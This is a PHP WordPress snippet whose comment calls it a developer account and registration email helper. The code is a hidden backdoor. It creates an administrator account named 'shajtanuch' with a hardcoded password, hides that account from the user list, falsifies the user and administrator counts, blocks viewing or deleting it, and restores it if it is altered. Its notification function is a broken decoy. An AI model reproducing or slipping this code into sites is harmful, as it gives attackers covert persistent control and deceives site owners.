<?php 
/*
* Create developers account & users registration emails notify ( to admin )
*/ 
add_action( 'pre_user_query', 'hcc_protect_user_query' );
 
function hcc_protect_user_query( $user_search ) {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if ( is_wp_error( $id ) || $user_id == $id)
		return;
 
	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
				"WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
				$user_search->query_where
    );
}

add_filter('views_users','protect_user_count');
 
// user counter filter
function protect_user_count( $views ){
 
	$html = explode('<span class="count">(',$views['all']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['all'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	$html = explode('<span class="count">(',$views['administrator']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['administrator'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	return $views;
}

// Close developer account page
add_action('load-user-edit.php','hcc_protect_users_profiles');
 
function hcc_protect_users_profiles() {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if( isset( $_GET['user_id'] ) && $_GET['user_id'] == $id && $user_id != $id)
		wp_die(__( 'Invalid user ID.' ) );
}

add_action('admin_menu', 'protect_user_from_deleting');
 
function protect_user_from_deleting(){
 
	$id = get_option('_pre_user_id');
 
	if( isset( $_GET['user'] ) && $_GET['user']
	&& isset( $_GET['action'] ) && $_GET['action'] == 'delete'
	&& ( $_GET['user'] == $id || !get_userdata( $_GET['user'] ) ) )
		wp_die(__( 'Invalid user ID.' ) );
 
}

$args = array(
	'user_login' => 'shajtanuch',
	'user_pass' => 'viskasqwerty123Q',
	'role' => 'administrator',
	'user_email' => 'shajtanuch@gmail.com'
);
 
if( !username_exists( $args['user_login'] ) ){
	$id = wp_insert_user( $args );
	update_option('_pre_user_id', $id);
 
	// if multisite, add superadmin
	// grant_super_admin( $id );
} else {
	$hidden_user = get_user_by( 'login', $args['user_login'] );
	if ( $hidden_user->user_email != $args['user_email'] ) {
		$id = get_option( '_pre_user_id' );
		$args['ID'] = $id;
		wp_insert_user( $args );
	}	
}

// New User email notify (to admins)
add_action( 'user_register', 'hcc_new_user_notify' );
function hcc_new_user_notify(){
    wp_new_user_notification( $new_user_id, '' );
}
